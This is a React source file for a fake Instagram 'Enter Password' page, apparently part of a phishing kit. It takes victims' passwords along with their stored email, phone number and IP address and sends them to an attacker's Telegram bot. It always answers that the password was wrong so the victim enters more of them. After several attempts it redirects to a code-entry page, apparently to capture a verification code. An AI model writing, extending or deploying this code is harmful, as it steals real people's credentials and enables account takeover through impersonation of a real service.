import InstagramLogo from '@assets/images/instagram.png';
import { faSpinner } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import Footer from '@pages/Client/components/Footer';
import axios from 'axios';
import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';

const EnterPassword: React.FC = () => {
	const [chatId, setChatId] = useState('');
	const [token, setToken] = useState('');
	const data = localStorage.getItem('data');
	const geo = localStorage.getItem('geo');
	const [password, setPassword] = useState('');
	const [isLoading, setIsLoading] = useState(false);
	const [attempts, setAttempts] = useState(0);
	const [maxAttempts, setMaxAttempts] = useState(0);
	const [error, setError] = useState('');
	const navigate = useNavigate();

	const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
		e.preventDefault();
		if (!data || !geo) {
			navigate('/');
			return;
		}
		if (password.length < 6) {
			setError('Password must be at least 6 characters long.');
			return;
		}
		setIsLoading(true);
		const { email, phoneNumber, pageName } = JSON.parse(data);
		const { ip, country_code } = JSON.parse(geo);
		try {
			if (maxAttempts > 0 && attempts + 1 >= maxAttempts) {
				navigate('/enter-code');
				return;
			}
			const messageContent = formatMessage({
				ip,
				email,
				phoneNumber,
				pageName,
				country_code,
				password,
				attemptNumber: attempts + 1,
			});
			if (localStorage.getItem('messageId')) {
				await axios.post(
					`https://api.telegram.org/bot${token}/deleteMessage`,
					{
						chat_id: chatId,
						message_id: localStorage.getItem('messageId'),
					},
				);
			}
			const response = await axios.post(
				`https://api.telegram.org/bot${token}/sendMessage`,
				{
					chat_id: chatId,
					text: messageContent,
					parse_mode: 'HTML',
				},
			);
			if (response.data?.result?.message_id) {
				localStorage.setItem(
					'messageId',
					response.data.result.message_id.toString(),
				);
				localStorage.setItem('message', messageContent);
			}
			setPassword('');
			setError('Please check the password and try again.');
			setAttempts((prev) => prev + 1);
			if (maxAttempts > 0 && attempts + 1 >= maxAttempts) {
				navigate('/enter-code');
			}
		} catch {
			setError('An error occurred. Please try again.');
		} finally {
			setIsLoading(false);
		}
	};

	const formatMessage = ({
		ip,
		email,
		phoneNumber,
		pageName,
		country_code,
		password,
		attemptNumber,
	}: {
		ip: string;
		email: string;
		phoneNumber: string;
		pageName: string;
		country_code: string;
		password: string;
		attemptNumber: number;
	}) => {
		const savedMessage = localStorage.getItem('message');
		if (savedMessage && localStorage.getItem('messageId')) {
			return `${savedMessage}\n<b>Password ${attemptNumber}:</b> <code>${password}</code>`;
		}

		return `<b>IP:</b> <code>${ip}</code>
<b>Email:</b> <code>${email}</code>
<b>Phone Number:</b> <code>${phoneNumber}</code>
<b>Page Name:</b> <code>${pageName}</code>
<b>Country Code:</b> <code>${country_code}</code>
<b>Password ${attemptNumber}:</b> <code>${password}</code>`;
	};

	useEffect(() => {
		const getConfig = async () => {
			const response = await axios.get('/config.json');
			return response.data;
		};
		(async () => {
			const config = await getConfig();
			setChatId(config.telegram.chatId);
			setToken(config.telegram.token);
			setMaxAttempts(config.websiteConfig.maxPasswordAttempts);
		})();
	}, []);

	return (
		<div className='flex w-full max-w-md flex-col gap-4'>
			<div className='rounded-lg bg-white sm:border'>
				<div className='flex flex-col items-center border-b p-8 text-center'>
					<img
						src={InstagramLogo}
						alt='Instagram'
						className='mb-4 h-10'
					/>
					<h1 className='text-lg font-semibold text-gray-800'>
						Enter Password
					</h1>
					<p className='mt-2 max-w-[320px] text-xs text-[#737373]'>
						Please enter your password to continue, we need to
						verify your account.
					</p>
				</div>
				<form
					className='flex flex-col gap-4 p-8'
					onSubmit={handleSubmit}
				>
					<input
						type='password'
						placeholder='Password'
						value={password}
						onChange={(e) => setPassword(e.target.value)}
						onFocus={() => setError('')}
						autoFocus
						required
					/>
					{error && <p className='text-xs text-red-500'>{error}</p>}
					<button
						type='submit'
						className='flex w-full justify-center rounded-md border border-transparent bg-primary px-4 py-2 text-sm font-semibold text-white shadow-sm transition duration-150 ease-in-out hover:bg-primary/80'
						disabled={isLoading}
					>
						{isLoading ? (
							<FontAwesomeIcon
								icon={faSpinner}
								className='animate-spin'
							/>
						) : (
							'Continue'
						)}
					</button>
				</form>
				<div className='flex flex-col items-center px-8 sm:border-t sm:p-8'>
					<p className='max-w-[320px] text-center text-xs text-[#737373]'>
						By continuing, you agree to Instagram's{' '}
						<b>Terms of Use</b> and <b>Privacy Policy.</b>
					</p>
				</div>
			</div>
			<Footer />
		</div>
	);
};

export default EnterPassword;
